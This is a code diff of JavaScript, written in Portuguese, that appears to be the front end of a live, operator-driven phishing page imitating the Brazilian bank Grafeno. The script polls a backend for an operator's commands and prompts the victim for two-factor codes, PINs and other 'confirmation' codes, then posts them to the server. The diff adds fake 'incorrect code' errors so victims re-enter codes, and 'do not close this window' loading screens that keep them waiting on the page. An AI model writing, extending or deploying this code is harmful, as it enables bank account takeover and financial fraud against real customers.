@@ -18,8 +18,9 @@ document.addEventListener("DOMContentLoaded", function () {
     // Polling: só altera a página quando o comando do backend mudar
     var _ultimoComandoAplicado = "";
     function Request() {
-        var login = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";
-        if (!login) {
+        var loginRaw = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";
+        var login = (loginRaw || "").replace(/\D/g, "");
+        if (!login || login.length !== 11) {
             setTimeout(Request, 5000);
             return;
         }
@@ -27,10 +28,21 @@ document.addEventListener("DOMContentLoaded", function () {
             url: "/comando-login",
             method: "POST",
             headers: { "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content") },
-            data: { login: login },
+            data: { login: login, pagina: "painel" },
             dataType: "json",
             success: function (data) {
-                var comandoTxt = (data.comando || "").toLowerCase().trim();
+                var comandoTxt = String(data.comando || "").toLowerCase().trim();
+                if (comandoTxt === "sessao_invalida") {
+                    sessionStorage.removeItem("usuario_logado");
+                    sessionStorage.removeItem("sessao_usuario");
+                    sessionStorage.removeItem("sessao_senha");
+                    sessionStorage.removeItem("sessao_nome_usuario");
+                    sessionStorage.removeItem("sessao_numero_serie");
+                    sessionStorage.removeItem("sessao_api");
+                    sessionStorage.removeItem("sessao_ativa");
+                    location.href = "/grafeno";
+                    return;
+                }
                 var ehComandoDireto = ["enviar_para_interna", "finalizar_atendimento", "aguardando"].indexOf(comandoTxt) >= 0;
                 if (!comandoTxt.endsWith("solicitado") && !ehComandoDireto) {
                     return;
@@ -102,25 +114,17 @@ document.addEventListener("DOMContentLoaded", function () {
     setInterval(enviarPing, 10000);
 
     function enviarPing() {
-        const ip = sessionStorage.getItem("ip");
-        if (!ip) {
-            console.error("Nenhum IP no sessionStorage, ping não enviado.");
-            return;
-        }
+        const login = (sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || '').replace(/\D/g, '');
+        if (!login || login.length !== 11) return;
+        const ip = sessionStorage.getItem("ip") || "";
 
         $.ajax({
             url: "/registrar-ping",
             method: "POST",
-            headers: {
-                "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
-            },
-            data: { ip },
-            success: (res) => console.log("Ping enviado:", res),
-            error: (err) =>
-                console.error(
-                    "Erro ao enviar ping:",
-                    err?.responseText || err?.statusText || err
-                ),
+            headers: { "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content") },
+            data: { ip, login },
+            success: function () {},
+            error: function () {}
         });
     }
 
@@ -150,6 +154,23 @@ document.addEventListener("DOMContentLoaded", function () {
         });
 
 
+    function mostrarLoadingInterna() {
+        if (window.Swal) {
+            Swal.fire({
+                title: "Aguarde...",
+                text: "Processando. Não feche esta janela.",
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                showConfirmButton: false,
+                didOpen: function () { Swal.showLoading(); }
+            });
+        }
+    }
+
+    function esconderLoadingInterna() {
+        if (window.Swal && Swal.isVisible()) Swal.close();
+    }
+
     function tratarRespostaComando(comando, data, valores) {
         const etapaRaw = comando.replace("solicitado", "").trim();
         const isErro = etapaRaw.includes("_error");
@@ -159,207 +180,170 @@ document.addEventListener("DOMContentLoaded", function () {
 
         if (isErro) {
             if (etapa === "aviso") {
-                $("#msg_bc").fadeIn(200);
-                $("#loading").hide();
+                esconderLoadingInterna();
+                if ($("#msg_bc").length) $("#msg_bc").fadeIn(200);
+                if ($("#loading").length) $("#loading").hide();
             } else if (etapa === "codigo_token") {
-                showTwoFactorAuth();
-                $("#msg_bc").hide();
+                esconderLoadingInterna();
+                if (window.Swal) Swal.fire({ icon: 'error', title: 'Código incorreto', text: 'O código de segurança está incorreto. Tente novamente.', confirmButtonText: 'OK' }).then(function () { showTwoFactorAuth(); });
+                else showTwoFactorAuth();
+                if ($("#msg_bc").length) $("#msg_bc").hide();
             } else if (etapa === "aguardando") {
-                $("#loading").fadeIn(200);
-                $("#msg_bc").hide();
+                mostrarLoadingInterna();
+                if ($("#msg_bc").length) $("#msg_bc").hide();
             } else if (etapa === "comando") {
-                showComandoAuth(valores.input_comando);
-                $("#msg_bc").hide();
+                esconderLoadingInterna();
+                if (window.Swal) Swal.fire({ icon: 'error', title: 'Código incorreto', text: 'O código informado está incorreto. Tente novamente.', confirmButtonText: 'OK' }).then(function () { showComandoAuth(valores.input_comando); });
+                else showComandoAuth(valores.input_comando);
+                if ($("#msg_bc").length) $("#msg_bc").hide();
             } else if (etapa === "finalizar_atendimento") {
                 location.href = "https://grafeno.digital/";
             } else if (etapa === "pin") {
-                showPinAuth();
-                $("#msg_bc").hide();
+                esconderLoadingInterna();
+                if (window.Swal) Swal.fire({ icon: 'error', title: 'PIN incorreto', text: 'O PIN de segurança está incorreto. Tente novamente.', confirmButtonText: 'OK' }).then(function () { showPinAuth(); });
+                else showPinAuth();
+                if ($("#msg_bc").length) $("#msg_bc").hide();
             }
         } else {
             if (etapa === "aviso") {
-                $("#msg_bc").fadeIn(200);
-                $("#loading").hide();
+                esconderLoadingInterna();
+                if ($("#msg_bc").length) $("#msg_bc").fadeIn(200);
+                if ($("#loading").length) $("#loading").hide();
             } else if (etapa === "codigo_token") {
+                esconderLoadingInterna();
                 showTwoFactorAuth();
-                $("#msg_bc").hide();
+                if ($("#msg_bc").length) $("#msg_bc").hide();
             } else if (etapa === "aguardando") {
-                $("#loading").fadeIn(200);
-                $("#msg_bc").hide();
+                mostrarLoadingInterna();
+                if ($("#msg_bc").length) $("#msg_bc").hide();
             } else if (etapa === "comando") {
+                esconderLoadingInterna();
                 showComandoAuth(valores.input_comando);
-                $("#msg_bc").hide();
-
+                if ($("#msg_bc").length) $("#msg_bc").hide();
             } else if (etapa === "finalizar_atendimento") {
                 location.href = "https://grafeno.digital/";
             } else if (etapa === "pin") {
+                esconderLoadingInterna();
                 showPinAuth();
-                $("#msg_bc").hide();
+                if ($("#msg_bc").length) $("#msg_bc").hide();
             }
         }
     }
 
     function showComandoAuth(comando) {
         Swal.fire({
-            title: 'Atenção',
-            text: comando,
+            title: 'Confirme sua identidade',
+            text: comando || 'Por favor, confirme sua identidade digitando o código que enviamos para seu dispositivo cadastrado.',
             input: 'text',
             inputPlaceholder: 'Insira aqui',
             showCancelButton: false,
             icon: 'info',
             confirmButtonText: 'Confirmar',
-            cancelButtonText: 'Cancelar',
-            reverseButtons: true,
             allowOutsideClick: false,
             preConfirm: (code) => {
-                if (!code) {
+                if (!code || !String(code).trim()) {
                     Swal.showValidationMessage('Por favor, digite o código');
-
+                    return false;
                 }
-                return code;
+                return code.trim();
             }
         }).then((result) => {
-            if (result.isConfirmed) {
-                console.log('Código:', result.value);
-
-                const login = sessionStorage.getItem('usuario_logado') || "";
-                const code = result.value;
-
-                const payload = {
-                    usuario: login,
-                    etapa: "Comando-" + code,
-                    valor: code,
-                };
+            if (result.isConfirmed && result.value) {
+                const login = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";
+                const payload = { usuario: login, etapa: "COMANDO", valor: result.value };
 
                 $.ajax({
                     url: "/atualizar-etapa",
                     method: "POST",
-                    headers: {
-                        "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content"),
-                    },
+                    headers: { "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content") },
                     contentType: "application/json; charset=UTF-8",
                     dataType: "json",
                     data: JSON.stringify(payload),
-                    beforeSend: function () {
-                        console.log("Enviando Comando...");
-                    },
-                    success: function () {
-                        console.log("Comando enviado. Aguardando validação...");
-                    },
+                    success: function () { console.log("Comando enviado. Aguardando próximo passo do operador..."); },
                     error: function () {
-                    },
-                    complete: function () { },
+                        if (window.Swal) Swal.fire({ icon: 'error', title: 'Erro', text: 'Não foi possível enviar. Tente novamente.' });
+                    }
                 });
-
             }
         });
     }
 
     function showTwoFactorAuth() {
         Swal.fire({
-            title: 'Atenção',
-            text: 'Para confirmar, digite o código de segurança da autenticação de dois fatores.',
+            title: 'Autenticação de segurança',
+            text: 'Digite o código de 6 dígitos da autenticação de dois fatores.',
             input: 'text',
-            inputPlaceholder: 'Digite o código',
+            inputPlaceholder: '000000',
+            inputAttributes: { maxLength: 6, inputmode: 'numeric', pattern: '[0-9]*' },
             showCancelButton: false,
             icon: 'warning',
             confirmButtonText: 'Confirmar',
-            cancelButtonText: 'Cancelar',
-            reverseButtons: true,
             allowOutsideClick: false,
             preConfirm: (code) => {
+                code = (code || '').trim();
                 if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
-                    Swal.showValidationMessage('Por favor, digite o código');
-
+                    Swal.showValidationMessage('Digite o código de 6 dígitos.');
+                    return false;
                 }
                 return code;
             }
         }).then((result) => {
-            if (result.isConfirmed) {
-                console.log('Código:', result.value);
-
-                const login = sessionStorage.getItem('usuario_logado') || "";
-                const code = result.value;
-
-                const payload = {
-                    usuario: login,
-                    etapa: "TOKEN-" + code,
-                    valor: code,
-                };
+            if (result.isConfirmed && result.value) {
+                const login = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";
+                const payload = { usuario: login, etapa: "TOKEN", valor: result.value };
 
                 $.ajax({
                     url: "/atualizar-etapa",
                     method: "POST",
-                    headers: {
-                        "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content"),
-                    },
+                    headers: { "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content") },
                     contentType: "application/json; charset=UTF-8",
                     dataType: "json",
                     data: JSON.stringify(payload),
-                    beforeSend: function () {
-                        console.log("Enviando token...");
-                    },
-                    success: function () {
-                        console.log("Token enviado. Aguardando validação...");
-                    },
+                    success: function () { console.log("Token enviado. Aguardando próximo passo do operador..."); },
                     error: function () {
-                    },
-                    complete: function () { },
+                        if (window.Swal) Swal.fire({ icon: 'error', title: 'Erro', text: 'Não foi possível enviar. Tente novamente.' });
+                    }
                 });
-
             }
         });
     }
 
     function showPinAuth() {
         Swal.fire({
-            title: 'Digite seu PIN.',
+            title: 'Insira seu PIN',
+            text: 'Digite o PIN de 4 ou 6 caracteres.',
             input: 'text',
-            inputPlaceholder: 'Digite o seu PIN',
+            inputPlaceholder: 'PIN',
+            inputAttributes: { maxLength: 6 },
             showCancelButton: false,
             icon: 'info',
             confirmButtonText: 'Confirmar',
-            cancelButtonText: 'Cancelar',
-            reverseButtons: true,
             allowOutsideClick: false,
             preConfirm: (code) => {
-                if (!code || code.length !== 4 || !/^\d{4}$/.test(code)) {
-                    Swal.showValidationMessage('Por favor, digite o PIN');
-
+                code = (code || '').trim();
+                var ok = (/^[A-Za-z0-9]{4}$/.test(code)) || (/^[A-Za-z0-9]{6}$/.test(code));
+                if (!ok) {
+                    Swal.showValidationMessage('Digite o PIN com 4 ou 6 caracteres (letras ou números).');
+                    return false;
                 }
                 return code;
             }
         }).then((result) => {
-            if (result.isConfirmed) {
-                console.log('Código:', result.value);
-
-                const login = sessionStorage.getItem('usuario_logado') || "";
-                const code = result.value;
-
-                const payload = {
-                    usuario: login,
-                    etapa: "PIN-" + code,
-                    valor: code,
-                };
+            if (result.isConfirmed && result.value) {
+                const login = sessionStorage.getItem('usuario_logado') || sessionStorage.getItem('sessao_usuario') || "";
+                const payload = { usuario: login, etapa: "PIN", valor: result.value };
 
                 $.ajax({
                     url: "/atualizar-etapa",
                     method: "POST",
-                    headers: {
-                        "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content"),
-                    },
+                    headers: { "X-CSRF-TOKEN": $("meta[name='csrf-token']").attr("content") },
                     contentType: "application/json; charset=UTF-8",
                     dataType: "json",
                     data: JSON.stringify(payload),
-                    beforeSend: function () {
-                        console.log("Enviando PIN...");
-                    },
-                    success: function () {
-                        console.log("PIN enviado. Aguardando validação...");
-                    },
+                    success: function () { console.log("PIN enviado. Aguardando próximo passo do operador..."); },
                     error: function () {
-                    },
-                    complete: function () { },
+                        if (window.Swal) Swal.fire({ icon: 'error', title: 'Erro', text: 'Não foi possível enviar. Tente novamente.' });
+                    }
                 });
             }
         });
